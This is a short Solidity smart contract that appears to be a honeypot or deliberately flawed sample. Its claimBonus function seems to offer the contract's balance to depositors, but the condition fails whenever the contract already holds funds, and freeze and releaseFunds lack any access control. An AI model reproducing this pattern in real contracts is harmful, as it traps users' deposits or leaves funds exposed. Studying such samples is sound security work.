 

pragma solidity ^0.4.4;

contract FirstContract {

  bool frozen = false;
  address owner;

  function FirstContract() payable {
    owner = msg.sender;
  }

  function freeze() {
    frozen = true;
  }

   
  function releaseFunds() {
    owner.transfer(this.balance);
  }

   
  function claimBonus() payable {
    if ((msg.value >= this.balance) && (frozen == false)) {
      msg.sender.transfer(this.balance);
    }
  }

}